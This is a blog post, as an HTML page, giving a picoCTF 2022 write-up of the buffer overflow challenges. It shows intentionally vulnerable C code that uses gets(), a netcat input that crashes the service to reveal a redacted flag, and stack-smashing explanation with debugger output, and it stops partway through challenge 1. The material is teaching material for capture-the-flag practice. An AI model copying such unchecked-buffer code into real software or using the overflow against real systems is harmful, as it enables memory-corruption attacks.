@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="theme-color" content="#171717">
+    <script src="https://kit.fontawesome.com/129342a70b.js" crossorigin="anonymous"></script>
+    
+
+    <meta name="description" content="Learn how to exploit vulnerable C functions to &quot;stack-smash&quot; executables—this is my writeup for the picoCTF 2022 binary&#x2F;pwn series &quot;Buffer overflow&quot;.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PicoCTF 2022: Buffer Overflow Series">
+<meta property="og:url" content="https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/index.html">
+<meta property="og:site_name" content="enscribe.dev">
+<meta property="og:description" content="Learn how to exploit vulnerable C functions to &quot;stack-smash&quot; executables—this is my writeup for the picoCTF 2022 binary&#x2F;pwn series &quot;Buffer overflow&quot;.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://enscribe.dev/static/picoctf-2022/buffer-overflow/banner.png">
+<meta property="article:published_time" content="2022-06-16T19:16:08.000Z">
+<meta property="article:modified_time" content="2023-08-30T22:41:13.386Z">
+<meta property="article:author" content="enscribe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="buffer-overflow">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://enscribe.dev/static/picoctf-2022/buffer-overflow/banner.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/static/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/static/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PicoCTF 2022: Buffer Overflow Series</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">posts</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">profiles</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="previous post" href="/blog/picoctf-2022/beginners-compilation/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="next post" href="/blog/byuctf-2022/osint-compilation/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">previous post</span>
+      <span id="i-next" class="info" style="display:none;">next post</span>
+      <span id="i-top" class="info" style="display:none;">back to top</span>
+      <span id="i-share" class="info" style="display:none;">share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&text=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&title=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&is_video=false&description=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PicoCTF 2022: Buffer Overflow Series&body=Check out this article: https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&title=PicoCTF 2022: Buffer Overflow Series"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/picoctf-2022/buffer-overflow-series/&name=PicoCTF 2022: Buffer Overflow Series&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-0"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-1"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-Explaining-the-Stack-%F0%9F%92%AC"><span class="toc-number">1.</span> <span class="toc-text">I: Explaining the Stack 💬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-Smashing-the-Stack-%F0%9F%94%A8"><span class="toc-number">2.</span> <span class="toc-text">II: Smashing the Stack 🔨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#III-Finessing-the-Stack-%F0%9F%9B%A0%EF%B8%8F"><span class="toc-number">3.</span> <span class="toc-text">III: Finessing the Stack 🛠️</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IV-Automating-the-Stack-%F0%9F%94%A7"><span class="toc-number">4.</span> <span class="toc-text">IV: Automating the Stack 🔧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-2"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-The-Hard-Way-%F0%9F%90%A2"><span class="toc-number">1.</span> <span class="toc-text">I: The Hard Way 🐢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-The-Easy-Way-%F0%9F%90%87"><span class="toc-number">2.</span> <span class="toc-text">II: The Easy Way 🐇</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-3"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-Finding-the-Canary-%F0%9F%90%A6"><span class="toc-number">1.</span> <span class="toc-text">I: Finding the Canary 🐦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-Bypassing-the-Canary-%F0%9F%92%A8"><span class="toc-number">2.</span> <span class="toc-text">II: Bypassing the Canary 💨</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        PicoCTF 2022: Buffer Overflow Series
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">enscribe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-16T19:16:08.000Z" itemprop="datePublished">Jun 16, 2022</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/blog/">blog</a> › <a class="category-link" href="/categories/blog/picoctf-2022/">picoctf-2022</a> › <a class="category-link" href="/categories/blog/picoctf-2022/pwn/">pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/buffer-overflow/" rel="tag">buffer-overflow</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="/static/picoctf-2022/buffer-overflow/banner.svg" alt="Banner"></p>
+<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>This is a writeup for the buffer overflow series during the <strong>picoCTF 2022</strong> competition. This was arguably my favorite set of challenges, as beforehand I’d never stepped into the realm of binary exploitation&#x2F;pwn. I learned a lot from this, so I highly recommend solving it by yourself before referencing this document. Cheers!</p>
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Buffer-overflow-0" class="chal-title"><a href="#Buffer-overflow-0" class="headerlink" title="Buffer overflow 0"></a>Buffer overflow 0</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>authors</b>: <br> - Alex Fulton<br> - Palash Oswal<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn/binary<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/buffer-overflow/vuln-0">vuln</a>, <a href="/static/picoctf-2022/buffer-overflow/vuln-0.c">vuln.c</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" style="font-size: 110%">
+                Smash the stack! Let's start off simple: can you overflow the correct buffer? The program is available <a href="/static/picoctf-2022/buffer-overflow/vuln-0">here</a>. You can view source <a href="/static/picoctf-2022/buffer-overflow/vuln-0.c">here</a>, and connect with it using:<br />
+<code>nc saturn.picoctf.net 65535</code>
+                <br><details><summary><b>Hints</b>:</summary><br><ol>
+<li>How can you trigger the flag to print?</li>
+</ol><br><ol start="2">
+<li>If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.</li>
+</ol><br><ol start="3">
+<li>Run <code>man gets</code> and read the BUGS section. How many characters can the program really read?</li>
+</ol><br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span> checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-0/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#5EBDAB">PIE enabled</span></pre></td></tr></table></div>
+
+<p>Let’s check out our source code:</p>
+<div><figure class="highlight c" style="height: 400px; overflow: scroll; margin: 1rem 0;"><table><figcaption><span>vuln-0.c</span><a href="https://enscribe.dev/static/picoctf-2022/buffer-overflow/vuln-0.c"><span>[download source]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span>
+
+<span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span>
+
+<span class="type">char</span> flag[FLAGSIZE_MAX];
+
+<span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span> {
+  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);
+  fflush(<span class="built_in">stdout</span>);
+  <span class="built_in">exit</span>(<span class="number">1</span>);
+}
+
+<span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span>{
+  <span class="type">char</span> buf2[<span class="number">16</span>];
+  <span class="built_in">strcpy</span>(buf2, input);
+}
+
+<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{
+  
+  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);
+  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) {
+    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,
+                    <span class="string">&quot;own debugging flag.\n&quot;</span>);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+  
+  fgets(flag,FLAGSIZE_MAX,f);
+  signal(SIGSEGV, sigsegv_handler); <span class="comment">// Set up signal handler</span>
+  
+  <span class="type">gid_t</span> gid = getegid();
+  setresgid(gid, gid, gid);
+
+
+  <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);
+  fflush(<span class="built_in">stdout</span>);
+  <span class="type">char</span> buf1[<span class="number">100</span>];
+  gets(buf1); 
+  vuln(buf1);
+  <span class="built_in">printf</span>(<span class="string">&quot;The program will exit now\n&quot;</span>);
+  <span class="keyword">return</span> <span class="number">0</span>;
+}</pre></td></tr></table></div>
+
+<p>The first thing we should do is check how the flag is printed. Looks like it’s handled in a <code>sigsegv_handler()</code> function:</p>
+<div><figure class="highlight c" style=""><table><tr><td class="gutter"><pre><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><div style="margin:1.2em 0"><span class="line"> </span></div><span class="line">31</span><br></pre></td><td class="code"><pre><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span> {
+  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);
+  fflush(<span class="built_in">stdout</span>);a
+  <span class="title function_">exit</span><span class="params">(<span class="number">1</span>)</span>;
+}
+<div class="skip-highlight">15-30</div>
+signal(SIGSEGV, sigsegv_handler);</pre></td></tr></table></div>
+
+<p>Researching online, a “SIGSEGV” stands for a <strong>segmentation fault</strong>, which is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist. If the flag <code>printf()</code> resides within <code>sigsegv_handler()</code>, then we can safely assume that we must figure out how to trigger a segmentation fault.</p>
+<p>We see that on line 40, the horrible <code>gets()</code> is called, and reads <code>buf1</code> (the user input) onto the stack. This function sucks, as it will write the user’s input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the <code>vuln()</code> function to trigger a segmentation fault:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$</span> nc saturn.picoctf.net 65535
+Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
+<div class="code-highlight">picoCTF{ov3rfl0ws_ar3nt_that_bad_<span style="color:#696969"><b>[REDACTED]</b></span>}</div></pre></td></tr></table></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Buffer-overflow-1" class="chal-title"><a href="#Buffer-overflow-1" class="headerlink" title="Buffer overflow 1"></a>Buffer overflow 1</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>authors</b>: <br> - Sanjay C.<br> - Palash Oswal<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn/binary<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 200<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/buffer-overflow/vuln-1">vuln</a>, <a href="/static/picoctf-2022/buffer-overflow/vuln-1.c">vuln.c</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" style="font-size: 110%">
+                Control the return address.<br />
+Now we're cooking! You can overflow the buffer and return to the flag function in the <a href="/static/picoctf-2022/buffer-overflow/vuln-1">program</a>. You can view source <a href="/static/picoctf-2022/buffer-overflow/vuln-1.c">here</a>. And connect with it using:<br />
+<code>nc saturn.picoctf.net [PORT]</code>
+                <br><details><summary><b>Hints</b>:</summary><br><ol>
+<li>Make sure you consider big Endian vs small Endian.</li>
+</ol><br><ol start="2">
+<li>Changing the address of the return pointer can call different functions.</li>
+</ol><br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-warning no-highlight"><i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <strong>instance-based</strong> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.</div>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-1/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#D41919">NX disabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+    RWX:      <span style="color:#D41919">Has RWX segments</span></pre></td></tr></table></div>
+
+<p>Let’s check out our source code:</p>
+<div><figure class="highlight c" style="height: 400px; overflow: scroll; margin: 1rem 0;"><table><figcaption><span>vuln-1.c</span><a href="https://enscribe.dev/static/picoctf-2022/buffer-overflow/vuln-1.c"><span>[download source]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line"></span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;asm.h&quot;</span></span>
+
+<span class="meta">#<span class="keyword">define</span> BUFSIZE 32</span>
+<span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span>
+
+<span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> {
+  <span class="type">char</span> buf[FLAGSIZE];
+  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);
+  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) {
+    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,
+                    <span class="string">&quot;own debugging flag.\n&quot;</span>);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  <span class="built_in">printf</span>(buf);
+}
+
+<span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>{
+  <span class="type">char</span> buf[BUFSIZE];
+  gets(buf);
+
+  <span class="built_in">printf</span>(<span class="string">&quot;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&quot;</span>, get_return_address());
+}
+
+<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{
+
+  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);
+  
+  <span class="type">gid_t</span> gid = getegid();
+  setresgid(gid, gid, gid);
+
+  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your string: &quot;</span>);
+  vuln();
+  <span class="keyword">return</span> <span class="number">0</span>;
+}</pre></td></tr></table></div>
+
+<p>In the <code>vuln()</code> function, we see that once again, the <code>gets()</code> function is being used. However, instead of triggering a segmentation fault like <kbd>Buffer overflow 0</kbd>, we will instead utilize its vulnerability to write our own addresses onto the stack, changing the return address to <code>win()</code> instead.</p>
+<h3 id="I-Explaining-the-Stack-💬"><a href="#I-Explaining-the-Stack-💬" class="headerlink" title="I: Explaining the Stack 💬"></a>I: Explaining the Stack 💬</h3><p>Before we get into the code, we need to figure out how to write our own addresses to the stack. Let’s start with a visual:</p>
+<p><img src="/static/picoctf-2022/buffer-overflow/stack-visual.svg" alt="Stack Visual"></p>
+<p>Whenever we call a function, multiple items will be “pushed” onto the <strong>top</strong> of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to <code>main()</code>, a base pointer, and a buffer. Note that the stack grows <strong>downwards</strong>, towards lower memory addresses, but the buffer is written <strong>upwards</strong>, towards higher memory addresses.</p>
+<p>We can “smash the stack” by exploiting the <code>gets()</code> function. If we pass in a large enough input, it will overwrite the entire buffer and start overflowing into the base pointer and return address within the stack:</p>
+<p><img src="/static/picoctf-2022/buffer-overflow/overflow-visual.png" alt="Overflow Visual"></p>
+<p>If we are deliberate of the characters we pass into <code>gets()</code>, we will be able to insert a new address to overwrite the return address to <code>win()</code>. Let’s try!</p>
+<h3 id="II-Smashing-the-Stack-🔨"><a href="#II-Smashing-the-Stack-🔨" class="headerlink" title="II: Smashing the Stack 🔨"></a>II: Smashing the Stack 🔨</h3><p>To start, we first need to figure out our “offset”. The offset is the distance, in characters, between the beginning of the buffer and the position of the <code>$eip</code>. This can be visualized with the <code>gdb-gef</code> utility by setting a breakpoint (a place to pause the runtime) in the <code>main()</code> function:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>GEF - "GDB enhanced features"</span><a target="_blank" rel="noopener" href="https://gef.readthedocs.io/en/master/"><span>[documentation]</span></a></figcaption><tr><td class="code"><pre><span style="color:#EC0101"><b>gef➤  </b></span>b main
+Breakpoint 1 at <span style="color:#367BF0">0x80492d7</span>
+<span style="color:#EC0101"><b>gef➤  </b></span>r
+Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
+Breakpoint 1, <span style="color:#367BF0">0x080492d7</span> in <span style="color:#FEA44C">main</span> ()
+[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
+<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>$eax   </b></span>: 0xf7fa39e8  →  <span style="color:#9755B3">0xffffd20c</span>  →  <span style="color:#9755B3">0xffffd3d1</span>  →  <span style="color:#FEA44C">"SHELL=/usr/bin/bash"</span>
+<span style="color:#367BF0">$ebx   </span>: 0x0       
+<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
+<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd194</span>  →  0x00000000
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd140</span>  →  <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
+<span style="color:#EC0101"><b>$ebp   </b></span>: <span style="color:#9755B3">0xffffd148</span>  →  0x00000000
+<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
+<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
+<span style="color:#EC0101"><b>$eip   </b></span>: <span style="color:#D41919">0x80492d7</span>  →  <span style="color:#585858"><b>&lt;main+19&gt; sub esp, 0x10</b></span>
+<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
+   <span style="color:#585858"><b> 0x80492d3 &lt;main+15&gt;        mov    ebp, esp</b></span>
+   <span style="color:#585858"><b> 0x80492d5 &lt;main+17&gt;        push   ebx</b></span>
+   <span style="color:#585858"><b> 0x80492d6 &lt;main+18&gt;        push   ecx</b></span>
+ <span style="color:#5EBDAB">→  0x80492d7 &lt;main+19&gt;        sub    esp, 0x10</span>
+    0x80492da &lt;main+22&gt;        call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;
+    0x80492df &lt;main+27&gt;        add    ebx, 0x2d21
+    0x80492e5 &lt;main+33&gt;        mov    eax, DWORD PTR [ebx-0x4]
+    0x80492eb &lt;main+39&gt;        mov    eax, DWORD PTR [eax]
+    0x80492ed &lt;main+41&gt;        push   0x0
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
+[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x80492d7</span> in <span style="color:#FF8A18"><b>main</b></span> (), reason: <span style="color:#962AC3"><b>BREAKPOINT</b></span></pre></td></tr></table></div>
+
